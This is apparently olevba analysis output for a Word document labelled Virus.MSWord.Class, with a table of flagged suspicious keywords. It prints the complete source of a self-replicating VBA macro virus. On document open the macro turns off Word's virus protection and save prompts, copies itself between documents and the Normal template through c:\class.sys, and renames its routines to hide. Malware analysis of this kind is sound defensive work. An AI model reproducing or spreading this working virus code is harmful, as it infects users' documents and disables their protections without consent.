olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-18c694b3881552249abc4d1d5dbef8921d1ddf2c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class-18c694b3881552249abc4d1d5dbef8921d1ddf2c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
 
On Error GoTo out
 
Options.VirusProtection = False

Options.SaveNormalPrompt = False
 
Options.ConfirmConversions = False

ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
 
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
 
If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
 
If nt = 0 Then
 
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
 
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
 
End If
 
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
 
If nt > 0 And ad > 0 Then GoTo out
 
host.codemodule.AddFromFile ("c:\class.sys")
 
With host.codemodule
 
    For x = 1 To 4
 
    .deletelines 1
 
    Next x
 
End With
 
If nt = 0 Then
 
    With host.codemodule
 
    .replaceline 1, "Sub AutoClose()"
 
    .replaceline 69, "Sub ToolsMacro()"
    
    End With
 
End If
 
With host.codemodule
 
    For x = 2 To 70 Step 2
 
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Now
 
    Next x

End With
 
out:
 
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 
End Sub

Sub ViewVBCode()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
